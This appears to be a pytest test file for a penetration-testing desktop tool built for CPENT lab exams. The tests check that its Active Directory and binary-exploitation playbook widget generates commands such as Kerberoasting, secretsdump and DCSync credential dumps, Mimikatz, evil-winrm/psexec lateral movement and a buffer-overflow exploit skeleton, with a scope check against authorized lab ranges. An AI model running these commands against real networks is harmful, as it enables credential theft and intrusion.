"""Unit and integration tests for Phase 4: Active Directory & Binary Exploitation Playbooks."""

from __future__ import annotations

import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from PySide6.QtCore import Qt
from PySide6.QtWidgets import QApplication

from desktop.main_window import MainWindow
from desktop.views.cpent_labs_view import CPENTLabsView
from desktop.widgets.ad_playbook_widget import ADPlaybookWidget
from storage.db import Database
from storage.models import Project, TargetScope, TargetType


@pytest.fixture
def db():
    return Database(":memory:")


@pytest.fixture
def sample_project(db: Database) -> Project:
    proj = db.create_project(
        Project(
            name="CPENT Active Directory Exam Range",
            client_name="Titan Defense Labs",
            engagement_id="ENG-2026-AD",
            lead_tester="Senior Pentester Leo",
        )
    )
    # Define authorized DC and subnet
    db.add_scope(
        TargetScope(
            project_id=proj.id,
            target="10.10.10.0/24",
            target_type=TargetType.CIDR_RANGE,
            is_authorized=True,
        )
    )
    return proj


def test_ad_playbook_widget_creation_and_defaults(qtbot):
    """Verifies default parameters, subtabs, and input controls."""
    widget = ADPlaybookWidget()
    qtbot.addWidget(widget)

    assert widget.edit_domain.text() == "CPENT.LOCAL"
    assert widget.edit_dc_ip.text() == "10.10.10.5"
    assert widget.edit_user.text() == "administrator"
    assert widget.playbook_tabs.count() == 2


def test_bloodhound_and_recon_commands_generation(qtbot):
    """Verifies BloodHound, NetExec, and LDAP domain dump command generation."""
    widget = ADPlaybookWidget()
    qtbot.addWidget(widget)

    widget.edit_domain.setText("CYBER.CORP")
    widget.edit_dc_ip.setText("172.16.10.2")
    widget.edit_user.setText("jdoe")
    widget.edit_pass.setText("Summer2026!")

    recon = widget.txt_ad_recon.toPlainText()
    assert "bloodhound-python -d CYBER.CORP -u jdoe -p Summer2026! -gc 172.16.10.2" in recon
    assert "nxc smb 172.16.10.2 -u jdoe -p Summer2026! --users" in recon
    assert "ldapdomaindump -u 'CYBER.CORP\\jdoe' -p 'Summer2026!' 172.16.10.2" in recon


def test_kerberos_attacks_generation(qtbot):
    """Verifies GetUserSPNs (Kerberoasting) and GetNPUsers (AS-REP) commands."""
    widget = ADPlaybookWidget()
    qtbot.addWidget(widget)

    widget.edit_domain.setText("TITAN.LAB")
    widget.edit_dc_ip.setText("10.10.10.5")
    widget.edit_user.setText("svc_sql")
    widget.edit_pass.setText("SQLPass123")

    kerb = widget.txt_ad_kerb.toPlainText()
    assert "GetUserSPNs.py TITAN.LAB/svc_sql:SQLPass123 -dc-ip 10.10.10.5 -request" in kerb
    assert "GetNPUsers.py TITAN.LAB/ -usersfile users.txt -format hashcat" in kerb
    # Hashcat Modes
    assert "hashcat -m 13100" in kerb  # Kerberos 5 TGS
    assert "hashcat -m 18200" in kerb  # Kerberos 5 AS-REP


def test_secretsdump_and_mimikatz_generation(qtbot):
    """Verifies NTDS.dit extraction and in-memory Mimikatz syntax."""
    widget = ADPlaybookWidget()
    qtbot.addWidget(widget)

    widget.edit_domain.setText("CPENT.LOCAL")
    widget.edit_dc_ip.setText("10.10.10.5")
    widget.edit_user.setText("administrator")
    widget.edit_pass.setText("P@ssw0rd2026")

    creds = widget.txt_ad_creds.toPlainText()
    assert "secretsdump.py CPENT.LOCAL/administrator:P@ssw0rd2026@10.10.10.5 -ntds -history" in creds
    assert "sekurlsa::logonpasswords" in creds
    assert "lsadump::dcsync /domain:CPENT.LOCAL /user:Administrator" in creds
    assert "hashcat -m 1000" in creds  # NTLM Mode


def test_lateral_movement_and_evil_winrm(qtbot):
    """Verifies Evil-WinRM, WMIExec, PSExec, and Golden Ticket commands."""
    widget = ADPlaybookWidget()
    qtbot.addWidget(widget)

    widget.edit_domain.setText("CPENT.LOCAL")
    widget.edit_target_host.setText("10.10.10.25")
    widget.edit_user.setText("admin")
    widget.edit_pass.setText("SecretPass!")

    lat = widget.txt_ad_lateral.toPlainText()
    assert "evil-winrm -i 10.10.10.25 -u admin -p 'SecretPass!'" in lat
    assert "wmiexec.py CPENT.LOCAL/admin:SecretPass!@10.10.10.25" in lat
    assert "psexec.py CPENT.LOCAL/admin:SecretPass!@10.10.10.25" in lat
    assert "ticketer.py" in lat


def test_proxychains_prefix_integration(qtbot):
    """Verifies that enabling ProxyChains checkbox prefixes attacks with proxychains4."""
    widget = ADPlaybookWidget()
    qtbot.addWidget(widget)

    assert widget.chk_proxychains.isChecked() is False
    assert "proxychains4" not in widget.txt_ad_recon.toPlainText()

    # Enable ProxyChains
    widget.chk_proxychains.setChecked(True)
    assert "proxychains4 -q bloodhound-python" in widget.txt_ad_recon.toPlainText()
    assert "proxychains4 -q GetUserSPNs.py" in widget.txt_ad_kerb.toPlainText()
    assert "proxychains4 -q secretsdump.py" in widget.txt_ad_creds.toPlainText()
    assert "proxychains4 -q evil-winrm" in widget.txt_ad_lateral.toPlainText()


def test_binary_exploit_pattern_and_badchars(qtbot):
    """Verifies Module 12 cyclic pattern creation and bad characters array generation."""
    widget = ADPlaybookWidget()
    qtbot.addWidget(widget)

    widget.spin_crash_len.setValue(3500)
    widget.spin_eip_offset.setValue(2006)
    widget.edit_badchars.setText("\\x00\\x0a\\x0d")

    pattern = widget.txt_bin_pattern.toPlainText()
    assert "msf-pattern_create -l 3500" in pattern
    assert "msf-pattern_offset -l 3500" in pattern

    badchars = widget.txt_bin_badchars.toPlainText()
    assert "!mona bytearray -b \"\\x00\\x0a\\x0d\"" in badchars
    assert "\\x00" not in badchars.split('badchars =')[1].split(')')[0]  # Excluded badchar


def test_binary_exploit_script_generation_and_export(qtbot, tmp_path: Path):
    """Verifies generation and saving of complete Python 3 exploit.py skeleton."""
    widget = ADPlaybookWidget()
    qtbot.addWidget(widget)

    widget.edit_target_host.setText("10.10.10.30")
    widget.spin_eip_offset.setValue(1052)
    widget.edit_jmp_esp.setText("\\x53\\x12\\x40\\x00")

    exploit_code = widget.txt_bin_exploit.toPlainText()
    assert 'TARGET_IP = "10.10.10.30"' in exploit_code
    assert "offset = 1052" in exploit_code
    assert 'retn = b"\\x53\\x12\\x40\\x00"' in exploit_code
    assert 'payload = overflow + retn + padding + buf' in exploit_code

    # Test saving
    target_py = tmp_path / "exploit.py"
    with patch("PySide6.QtWidgets.QFileDialog.getSaveFileName", return_value=(str(target_py), "")):
        with patch("PySide6.QtWidgets.QMessageBox.information"):
            widget._save_exploit_script()

    assert target_py.exists()
    assert "TARGET_IP" in target_py.read_text(encoding="utf-8")


def test_scope_validation_guard_ad(qtbot, db: Database, sample_project: Project):
    """Verifies that DC and target IPs are validated against project scope."""
    widget = ADPlaybookWidget(db=db)
    qtbot.addWidget(widget)
    widget.set_active_project(sample_project)

    # In-scope DC (10.10.10.0/24 is authorized)
    widget.edit_dc_ip.setText("10.10.10.5")
    widget.edit_target_host.setText("10.10.10.20")
    assert "Authorized Scope" in widget.lbl_scope_banner.text()

    # Out-of-scope DC
    widget.edit_dc_ip.setText("192.168.99.1")
    assert "Out-of-Scope Warning" in widget.lbl_scope_banner.text()


def test_command_to_shell_signal_emission_ad(qtbot):
    """Verifies that clicking Send to Shell emits command_to_shell_requested."""
    widget = ADPlaybookWidget()
    qtbot.addWidget(widget)

    signals_received = []
    widget.command_to_shell_requested.connect(lambda cmd: signals_received.append(cmd))

    # Send first command
    widget._send_first_command_to_shell("bloodhound-python -d CPENT.LOCAL\n# comment")
    assert len(signals_received) == 1
    assert signals_received[0] == "bloodhound-python -d CPENT.LOCAL"


def test_integration_in_main_window_ad(qtbot, db: Database, sample_project: Project):
    """Verifies that ADPlaybookWidget is docked in CPENTLabsView and MainWindow."""
    main_win = MainWindow(db=db)
    qtbot.addWidget(main_win)
    main_win._on_project_selected(sample_project)

    assert hasattr(main_win.cpent_view, "tab_ad_playbook")
    assert isinstance(main_win.cpent_view.tab_ad_playbook, ADPlaybookWidget)

    # 5+ tabs total now
    assert main_win.cpent_view.tabs.count() >= 5
    tab_titles = [main_win.cpent_view.tabs.tabText(i) for i in range(main_win.cpent_view.tabs.count())]
    assert any("Active Directory" in t for t in tab_titles)

